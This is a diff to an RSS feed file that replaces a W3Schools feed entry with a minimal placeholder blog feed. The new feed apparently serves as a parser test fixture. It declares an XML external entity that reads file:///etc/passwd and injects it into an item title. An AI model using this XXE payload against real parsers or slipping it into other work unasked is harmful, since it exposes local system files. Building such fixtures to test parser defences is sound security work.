@@ -1,36 +1,18 @@
-<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0">
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE title [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
-<title>
-<![CDATA[ W3Schools Online Web Tutorials ]]>
-</title>
-<description>
-<![CDATA[ W3Schools offers free online tutorials, references and exercises in all the major languages of the web. Covering popular subjects like HTML, CSS, JavaScript, Python, SQL, Java, and many, many more. ]]>
-</description>
-<link>https://www.w3schools.com/</link>
-<image>
-<url>https://www.w3schools.com/apple-touch-icon.png</url>
-<title>W3Schools Online Web Tutorials</title>
-<link>https://www.w3schools.com/</link>
-</image>
-<generator>https://rss.app</generator>
-<lastBuildDate>Fri, 14 Nov 2025 03:28:51 GMT</lastBuildDate>
-<atom:link href="https://rss.app/feeds/OLSecNX2r0DaSXmH.xml" rel="self" type="application/rss+xml"/>
-<language>
-<![CDATA[ en-US ]]>
-</language>
+<title>The Blog</title>
+<link>http://example.com/</link>
+<description>A blog about things</description>
+<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
 <item>
-<title>
-<![CDATA[ [Action required] Your RSS.app Trial has Expired. ]]>
-</title>
-<description>
-<![CDATA[ Your trial has expired. Please update your subscription plan at <a href="https://rss.app">rss.app</a>. - (OLSecNX2r0DaSXmH) ]]>
-</description>
-<link>https://rss.app</link>
-<guid isPermaLink="false">6827a856afba4e95e7778cfb18c72424</guid>
-<dc:creator>
-<![CDATA[ rss.app ]]>
-</dc:creator>
-<pubDate>Fri, 14 Nov 2025 03:28:51 GMT</pubDate>
+<title>&xxe;</title>
+<link>http://example.com</link>
+<description>a post</description>
+<author>author@example.com</author>
+<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
 </item>
 </channel>
 </rss>
